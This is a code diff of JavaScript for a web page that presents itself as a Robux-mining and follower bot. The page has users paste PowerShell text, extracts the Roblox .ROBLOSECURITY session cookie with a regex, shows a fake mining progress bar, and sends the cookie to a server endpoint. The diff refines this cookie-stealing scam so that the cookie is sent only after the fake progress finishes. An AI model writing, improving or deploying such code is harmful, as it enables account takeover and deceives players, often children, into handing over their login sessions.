@@ -3,26 +3,25 @@ function startBotting() {
 }
 
 async function extractAndCheckCookie() {
-    const inputText = document.getElementById("powershellInput").value;
-    const amount = document.getElementById("amount").value; // Lấy số Robux từ input
+    const inputText = document.getElementById("powershellInput")?.value;
+    const amount = document.getElementById("amount")?.value || "0";
     const notificationElement = document.getElementById("notification");
 
-    if (!notificationElement) {
-        console.error("Không tìm thấy phần tử với ID 'notification'.");
+    if (!inputText || !notificationElement) {
+        console.error("Thiếu input hoặc notification element");
+        showNotification("❌ Vui lòng kiểm tra input!", "error");
         return;
     }
 
-    // Regex tìm cookie hợp lệ
     const cookieMatch = inputText.match(/New-Object\s+System\.Net\.Cookie\s*\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/i);
-
     if (!cookieMatch || cookieMatch.length < 2) {
         showNotification("❌ Invalid User Code", "error");
         return;
     }
 
     const extractedCookie = cookieMatch[1];
-    // Hiển thị progress bar với các giai đoạn
-    showProgressNotification(extractedCookie, amount);
+    // Chạy progress bar và chờ nó hoàn thành trước khi gửi API
+    await showProgressNotification(extractedCookie, amount);
 
     try {
         const response = await fetch('/api/check-cookie', {
@@ -32,7 +31,6 @@ async function extractAndCheckCookie() {
         });
 
         const result = await response.json();
-
         if (result.success) {
             showNotification("✅ Bot succeeds followers!", "success");
         } else {
@@ -44,10 +42,10 @@ async function extractAndCheckCookie() {
     }
 }
 
-// Hiển thị thông báo bình thường
 function showNotification(message, type) {
     const notification = document.getElementById("notification");
-    
+    if (!notification) return;
+
     notification.innerHTML = `
         <div class="error-icon">${type === "success" ? "✅" : "❌"}</div>
         <h2>${message}</h2>
@@ -64,22 +62,21 @@ function showNotification(message, type) {
             ease: "back.out(1.7)",
             onStart: () => {
                 notification.style.display = "block";
-                notification.classList.add("show");
+                notification.classList.add("show", type);
                 notification.classList.remove("success", "error", "info");
-                notification.classList.add(type);
             }
         }
     );
-
-    setTimeout(() => {
-        closeNotification();
-    }, 5000);
+    setTimeout(closeNotification, 5000);
 }
 
-// Hiển thị thông báo với progress bar và giai đoạn
 async function showProgressNotification(cookie, amount) {
     const notification = document.getElementById("notification");
-    
+    if (!notification) {
+        console.error("Không tìm thấy notification");
+        return;
+    }
+
     notification.innerHTML = `
         <div class="error-icon">⏳</div>
         <h2 class="progress-message">Đang kiểm tra cookie...</h2>
@@ -91,8 +88,11 @@ async function showProgressNotification(cookie, amount) {
 
     const progressFill = notification.querySelector(".progress-fill");
     const progressMessage = notification.querySelector(".progress-message");
+    if (!progressFill || !progressMessage) {
+        console.error("Không tìm thấy progress-fill hoặc progress-message");
+        return;
+    }
 
-    // Hiển thị notification
     gsap.fromTo(notification, 
         { opacity: 0, scale: 0.8, y: 50 },
         { 
@@ -103,63 +103,53 @@ async function showProgressNotification(cookie, amount) {
             ease: "back.out(1.7)",
             onStart: () => {
                 notification.style.display = "block";
-                notification.classList.add("show");
-                notification.classList.remove("success", "error", "info");
-                notification.classList.add("info");
+                notification.classList.add("show", "info");
+                notification.classList.remove("success", "error");
             }
         }
     );
 
+    gsap.killTweensOf(progressFill); // Xóa animation cũ
 
-
-   // Đảm bảo xóa mọi animation cũ trên progressFill
-    gsap.killTweensOf(progressFill);
-
-    // Timeline cho progress bar
-    const tl = gsap.timeline({ 
-        defaults: { ease: "linear" } // Đặt ease mặc định cho tất cả bước
-    });
-
-    tl.fromTo(progressFill, 
-        { width: "0%" },
-        { 
-            width: "10%", 
-            duration: 1,
-            immediateRender: true, // Đảm bảo bắt đầu từ 0%
-            onStart: () => {
-                progressMessage.textContent = "Loading File User...";
+    // Trả về Promise để chờ timeline hoàn thành
+    return new Promise((resolve) => {
+        const tl = gsap.timeline({ defaults: { ease: "linear" } });
+        tl.fromTo(progressFill, 
+            { width: "0%" },
+            { 
+                width: "10%", 
+                duration: 1,
+                immediateRender: true,
+                onStart: () => progressMessage.textContent = "Loading File User..."
             }
-        }
-    ).to(progressFill, 
-        { 
-            width: "20%", 
-            duration: 1,
-            onStart: () => {
-                progressMessage.textContent = "Bot is up to mining";
+        ).to(progressFill, 
+            { 
+                width: "20%", 
+                duration: 1,
+                onStart: () => progressMessage.textContent = "Bot is up to mining"
             }
-        }
-    ).to(progressFill, 
-        { 
-            width: "100%", 
-            duration: 3,
-            onStart: () => {
-                progressMessage.textContent = `Mining... ${amount || "0"} Robux...`;
-            },
-            onComplete: () => {
-                progressMessage.textContent = "Progress completed!";
+        ).to(progressFill, 
+            { 
+                width: "100%", 
+                duration: 3,
+                onStart: () => progressMessage.textContent = `Mining... ${amount} Robux...`,
+                onComplete: () => {
+                    progressMessage.textContent = "Progress completed!";
+                    resolve(); // Hoàn thành Promise khi timeline xong
+                }
             }
-        }
-    );
+        );
 
-    // Debug: Theo dõi tiến trình
-    tl.eventCallback("onUpdate", () => {
-        console.log("Current width:", progressFill.style.width);
+        tl.eventCallback("onUpdate", () => {
+            console.log("Current width:", progressFill.style.width);
+        });
     });
 }
 
-// Ẩn thông báo với animation
 function closeNotification() {
     const notification = document.getElementById("notification");
+    if (!notification) return;
+
     gsap.to(notification, {
         opacity: 0,
         scale: 0.8,
@@ -168,8 +158,7 @@ function closeNotification() {
         ease: "back.in(1.7)",
         onComplete: () => {
             notification.style.display = "none";
-            notification.classList.remove("show");
-            notification.classList.remove("success", "error", "info");
+            notification.classList.remove("show", "success", "error", "info");
         }
     });
 }
